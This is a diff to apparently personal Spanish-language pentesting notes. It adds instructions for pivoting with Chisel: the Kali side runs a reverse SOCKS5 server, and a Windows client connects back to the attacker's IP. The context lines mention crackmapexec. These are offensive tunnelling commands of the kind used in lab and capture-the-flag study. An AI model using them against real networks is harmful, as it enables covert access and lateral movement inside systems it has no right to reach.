@@ -1258,8 +1258,6 @@ go build -ldflags "-s -w" .
 upx chisel
 ```
 
-
-
 1. enviar a la maquina linux el archivo chisel de windows
 2. En nuestra maquina atacante ejecutamos el chisel para abrir el puerto que queramos en modo serve
 ```c
@@ -1292,6 +1290,21 @@ crackmapexec 127.0.0.1 -u 'username'  -p 'password '
 
 ```c
 ./chisel client 192.168.50.10:9002 R:socks
+```
+
+Pivoting Chisel de kali a windows
+
+En kali con proxychains socks5 en 1080
+
+KALI escucha en el puerto 8080 por defecto
+```c
+./chisel server --socks5 --reverse
+```
+
+Windows
+
+```c
+.\chisel_windows.exe client --fingerprint 6F8h9OQGNQhnYUvLXbQiq+8xpH/jRdK+DSs7hx6DhW8= MI_IP:8080 R:socks
 ```
 
 ##### Ligolo-ng
